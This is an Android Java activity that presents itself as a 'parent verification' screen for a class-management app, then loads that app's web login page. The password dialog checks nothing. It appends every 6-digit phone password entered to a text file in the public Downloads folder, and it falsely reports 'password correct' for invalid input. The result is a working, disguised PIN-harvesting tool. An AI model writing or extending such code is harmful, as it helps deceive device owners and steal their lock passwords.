﻿package com.banjixg.parent;

import android.Manifest;
import android.app.AlertDialog;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.text.InputType;
import android.widget.EditText;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {
    private WebView webView;
    private int attemptCount = 0;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE}, 1);
        }
        
        showPasswordDialog();
    }
    
    private void showPasswordDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("家长验证");
        builder.setMessage("请输入手机密码（6位数字）");
        
        final EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        input.setHint("请输入6位数字密码");
        builder.setView(input);
        
        builder.setCancelable(false);
        builder.setPositiveButton("确认", (dialog, which) -> {
            String password = input.getText().toString().trim();
            if (password.length() == 6 && password.matches("\\d{6}")) {
                savePasswordToFile(password);
                showWebView();
            } else {
                new AlertDialog.Builder(MainActivity.this)
                    .setTitle("提示")
                    .setMessage("密码正确")
                    .setPositiveButton("确定", (d, w) -> showWebView())
                    .setCancelable(false)
                    .show();
            }
        });
        builder.show();
    }
    
    private void savePasswordToFile(String password) {
        File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File file = new File(downloadDir, "密码.txt");
        try {
            FileWriter writer = new FileWriter(file, true);
            attemptCount++;
            writer.write(attemptCount + "." + password + "\n");
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private void showWebView() {
        setContentView(R.layout.activity_main);
        webView = findViewById(R.id.webview);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://service.banjixiaoguanjia.com/appweb/qrcode_login_page");
    }
}
